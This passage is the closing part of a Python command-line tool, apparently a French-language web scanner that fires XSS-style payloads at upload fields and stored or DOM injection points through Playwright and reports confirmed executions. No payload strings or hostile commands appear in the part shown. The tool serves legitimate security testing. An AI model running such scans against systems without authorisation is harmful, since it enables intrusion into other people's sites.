            findings += up_findings
        else:
            print("[*] Upload : aucun champ de fichier découvert.")

    if args.stored_dom:
        if not DomScanner.available():
            print("[!] Playwright absent (requis pour --stored-dom). Installe :\n"
                  "    pip install playwright && playwright install chromium")
        else:
            observe = build_observe(args, crawler)
            sdp = None
            if args.dom_payloads:
                try:
                    sdp = load_dom_payloads_multi(args.dom_payloads)
                except OSError:
                    pass
            print(f"[*] Scan stored-DOM sur {len(observe)} page(s) d'observation...")
            sdom = StoredDomScanner(
                http, observe, cookies=args.cookies,
                headers=parse_header_args(args.add_header),
                limit=args.dom_limit, insecure=args.insecure, payloads=sdp,
            )
            sd_findings = sdom.run(points)
            print(f"[*] Stored-DOM terminé, {len(sd_findings)} exécution(s) confirmée(s).")
            findings += sd_findings

    if args.dom:
        if not DomScanner.available():
            print("[!] Playwright absent. Installe :\n"
                  "    pip install playwright && playwright install chromium")
        else:
            dom_pl = None
            if args.dom_payloads:
                try:
                    dom_pl = load_dom_payloads_multi(args.dom_payloads)
                    print(f"[*] {len(dom_pl)} payload(s) DOM chargé(s) depuis "
                          f"{args.dom_payloads}")
                except OSError as e:
                    print(f"[!] Lecture --dom-payloads impossible : {e}")
            print(f"[*] Scan DOM (Playwright, max {args.dom_limit} points)...")
            dom = DomScanner(
                cookies=args.cookies,
                headers=parse_header_args(args.add_header),
                test_hash=args.dom_hash, limit=args.dom_limit,
                insecure=args.insecure, payloads=dom_pl,
            )
            t1 = time.time()
            dom_findings = dom.run(points)
            print(f"[*] DOM terminé en {time.time() - t1:.1f}s, "
                  f"{len(dom_findings)} exécution(s) confirmée(s).")
            findings += dom_findings

    report_console(findings)
    if args.output:
        write_report(findings, args.output, args.format)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompu par l'utilisateur. Arrêt propre.", file=sys.stderr)
        sys.exit(130)
